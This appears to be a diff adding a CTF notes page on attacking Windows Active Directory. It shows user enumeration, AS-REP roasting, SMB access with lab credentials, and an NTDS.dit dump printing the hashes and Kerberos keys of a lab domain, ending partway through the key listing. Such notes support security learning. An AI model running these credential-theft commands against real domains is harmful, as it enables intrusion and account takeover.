@@ -1,0 +1,343 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>Windows // 0x53CTF</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.108.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="5YC10P5" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1b165e60871be07c93da04ef30238e50223c9da30f957d760f25b24143926af9.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Windows"/>
+<meta name="twitter:description" content="enum4linux &gt; enum4linux [options] ip Usage: /usr/bin/enum4linux [options] ip Options are (like &#34;enum&#34;): -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default &#34;&#34;) -p pass specify password to use (default &#34;&#34;) The following options from enum.exe aren&#39;t implemented: -L, -N, -D, -f Additional options: -a Do all simple enumeration (-U -S -G -P -r -o -n -i)."/>
+
+    <meta property="og:title" content="Windows" />
+<meta property="og:description" content="enum4linux &gt; enum4linux [options] ip Usage: /usr/bin/enum4linux [options] ip Options are (like &#34;enum&#34;): -U get userlist -M get machine list* -S get sharelist -P get password policy information -G get group and member list -d be detailed, applies to -U and -S -u user specify username to use (default &#34;&#34;) -p pass specify password to use (default &#34;&#34;) The following options from enum.exe aren&#39;t implemented: -L, -N, -D, -f Additional options: -a Do all simple enumeration (-U -S -G -P -r -o -n -i)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://53ctf.github.io/posts/notes/windows/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-18T12:36:43+05:30" />
+<meta property="article:modified_time" content="2023-01-18T12:36:43+05:30" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://53ctf.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="5YC10P5" /></a>
+      <span class="app-header-title">0x53CTF</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/hackthebox/">HTB</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/notes/">Notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>This is where I keep my notes and also where I post articles, writeups, walkthroughs and stuff like that so everybody else can learn something out of it.....</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/53ctf" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://web.facebook.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>HackTheBox</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">Windows</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 18, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          5 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://53ctf.github.io/tags/windows/">Windows</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h2 id="enum4linux">enum4linux</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; enum4linux <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> ip
+</span></span></code></pre></div><pre tabindex="0"><code>Usage: /usr/bin/enum4linux [options] ip
+
+Options are (like &#34;enum&#34;):
+    -U        get userlist
+    -M        get machine list*
+    -S        get sharelist
+    -P        get password policy information
+    -G        get group and member list
+    -d        be detailed, applies to -U and -S
+    -u user   specify username to use (default &#34;&#34;)
+    -p pass   specify password to use (default &#34;&#34;)
+
+The following options from enum.exe aren&#39;t implemented: -L, -N, -D, -f
+
+Additional options:
+    -a        Do all simple enumeration (-U -S -G -P -r -o -n -i).
+              This option is enabled if you don&#39;t provide any other options.
+    -h        Display this help message and exit
+    -r        enumerate users via RID cycling
+    -R range  RID ranges to enumerate (default: 500-550,1000-1050, implies -r)
+    -K n      Keep searching RIDs until n consective RIDs don&#39;t correspond to
+              a username.  Impies RID range ends at 999999. Useful
+              against DCs.
+    -l        Get some (limited) info via LDAP 389/TCP (for DCs only)
+    -s file   brute force guessing for share names
+    -k user   User(s) that exists on remote system (default: administrator,guest,krbtgt,domain admins,root,bin,none)
+              Used to get sid with &#34;lookupsid known_username&#34;
+              Use commas to try several users: &#34;-k admin,user1,user2&#34;
+    -o        Get OS information
+    -i        Get printer information
+    -w wrkg   Specify workgroup manually (usually found automatically)
+    -n        Do an nmblookup (similar to nbtstat)
+    -v        Verbose.  Shows full commands being run (net, rpcclient, etc.)
+    -A        Aggressive. Do write checks on shares etc
+</code></pre><h2 id="kerbrute">Kerbrute</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; kerbrute <span style="color:#f92672">[</span>command<span style="color:#f92672">]</span>
+</span></span></code></pre></div><pre tabindex="0"><code>Available Commands:
+  bruteforce    Bruteforce username:password combos, from a file or stdin
+  bruteuser     Bruteforce a single user&#39;s password from a wordlist
+  help          Help about any command
+  passwordspray Test a single password against a list of users
+  userenum      Enumerate valid domain usernames via Kerberos
+  version       Display version info and quit
+
+Flags:
+      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
+      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
+  -d, --domain string   The full domain to use (e.g. contoso.com)
+  -h, --help            help for kerbrute
+  -o, --output string   File to write logs to. Optional.
+      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
+  -t, --threads int     Threads to use (default 10)
+  -v, --verbose         Log failures and errors
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Example of enumerating users</span>
+</span></span><span style="display:flex;"><span>&gt; kerbrute -d spookysec.local --dc spookysec.local userenum userlist.txt
+</span></span></code></pre></div><h2 id="getnpuserspy-impacket">GetNPUsers.py [Impacket]</h2>
+<pre tabindex="0"><code>usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]
+                     [-dc-ip ip address] [-dc-host hostname]
+                     target
+
+Queries target domain for users with &#39;Do not require Kerberos preauthentication&#39; set and export their TGTs for cracking
+
+positional arguments:
+  target                [[domain/]username[:password]]
+
+options:
+  -h, --help            show this help message and exit
+  -request              Requests TGT for users and output them in JtR/hashcat format (default False)
+  -outputfile OUTPUTFILE
+                        Output filename to write ciphers in JtR/hashcat format
+  -format {hashcat,john}
+                        format to save the AS_REQ of users without pre-authentication. Default is hashcat
+  -usersfile USERSFILE  File with user per line to test
+  -ts                   Adds timestamp to every logging output
+  -debug                Turn DEBUG output ON
+
+authentication:
+  -hashes LMHASH:NTHASH
+                        NTLM hashes, format is LMHASH:NTHASH
+  -no-pass              don&#39;t ask for password (useful for -k)
+  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones
+                        specified in the command line
+  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
+
+connection:
+  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain part (FQDN) specified in the target parameter
+  -dc-host hostname     Hostname of the domain controller to use. If ommited, the domain part (FQDN) specified in the account parameter will be used
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Example of ASREPRoasting </span>
+</span></span><span style="display:flex;"><span>&gt; /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile users.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20221214.172823.8799a1a - Copyright <span style="color:#ae81ff">2022</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:dff1bf6a67888d1b917e3330fb941140$b26e0760068893a8f281029d5c2fdc8e2e819d476f8ac69d84277a4a7c34ba7cc56e2f4593778b710a8d5f127e467347442c9e178aeacc86cff8b84a932e5cdc9d391fe321976ff432c6bc99ca9c66522ba828da7274d94a1ba24d1763d4ced25c9f684a10e41599b3fc4d19e76d371b58fff442c621a22f0ac907f24a6974ddb35fd3d520e65e1b916db08f0d5e7619deadc8e132fd1bc831f94c16e2ba495b208ac1354f5cb3c239d81f284add23d6c5ce66c81a927b4afebaf0b00775043b444555029e899d9c0d95f3f7fbfa3caf2093f987a40672cebb3885af127cd6c921b27410ec4280aa43ec00efef7bfce801cc
+</span></span></code></pre></div><h2 id="smbclient">smbclient</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; smbclient -U svc-admin --password management2005 -L spookysec.local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        backup          Disk
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
+</span></span></code></pre></div><h2 id="dump-the-ntdsdit-from-target-dc">Dump the NTDS.dit from target DC</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; crackmapexec smb spookysec.local -u backup -p <span style="color:#e6db74">&#39;backup2517860&#39;</span> --ntds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:ATTACKTIVEDIREC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:spookysec.local<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> spookysec.local<span style="color:#ae81ff">\b</span>ackup:backup2517860
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumping the NTDS, this could take a <span style="color:#66d9ef">while</span> so go grab a redbull...
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  spookysec.local<span style="color:#ae81ff">\a</span>-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0d77f90fe202899388be5cf7eff2f79e:::
+</span></span><span style="display:flex;"><span>SMB         spookysec.local <span style="color:#ae81ff">445</span>    ATTACKTIVEDIREC  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Dumped <span style="color:#ae81ff">18</span> NTDS hashes to /home/syclops/.cme/logs/ATTACKTIVEDIREC_spookysec.local_2023-01-18_165517.ntds of which <span style="color:#ae81ff">17</span> were added to the database
+</span></span></code></pre></div><h2 id="extracting-hashes-from-ntdsdit">Extracting hashes from NTDS.dit</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; sudo secretsdump.py spookysec.local/backup:backup2517860@10.10.152.60
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Impacket v0.10.1.dev1+20230118.142.d0c05de1 - Copyright <span style="color:#ae81ff">2022</span> Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Dumping Domain Credentials <span style="color:#f92672">(</span>domain<span style="color:#ae81ff">\u</span>id:rid:lmhash:nthash<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\a</span>-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+</span></span><span style="display:flex;"><span>ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:0d77f90fe202899388be5cf7eff2f79e:::
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Kerberos keys grabbed
+</span></span><span style="display:flex;"><span>Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
+</span></span><span style="display:flex;"><span>Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
+</span></span><span style="display:flex;"><span>Administrator:des-cbc-md5:2079ce0e5df189ad
+</span></span><span style="display:flex;"><span>krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
+</span></span><span style="display:flex;"><span>krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
+</span></span><span style="display:flex;"><span>krbtgt:des-cbc-md5:b94f97e97fabbf5d
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>kidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>kidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>kidy:des-cbc-md5:b092a73e3d256b1f
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\b</span>reakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\b</span>reakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\b</span>reakerofthings:des-cbc-md5:7a976bbfab86b064
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\j</span>ames:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\j</span>ames:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\j</span>ames:des-cbc-md5:dc971f4a91dce5e9
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\o</span>ptional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\o</span>ptional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\o</span>ptional:des-cbc-md5:8c6e2a8a615bd054
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>herlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>herlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\s</span>herlocksec:des-cbc-md5:08dca4cbbc3bb594
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\d</span>arkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\d</span>arkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\d</span>arkstar:des-cbc-md5:758af4d061381cea
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\O</span>ri:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\O</span>ri:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\O</span>ri:des-cbc-md5:1c8f79864654cd4a
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\r</span>obin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\r</span>obin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\r</span>obin:des-cbc-md5:89a7c2fe7a5b9d64
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\p</span>aradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\p</span>aradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\p</span>aradox:des-cbc-md5:83988983f8b34019
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\M</span>uirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
+</span></span><span style="display:flex;"><span>spookysec.local<span style="color:#ae81ff">\M</span>uirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
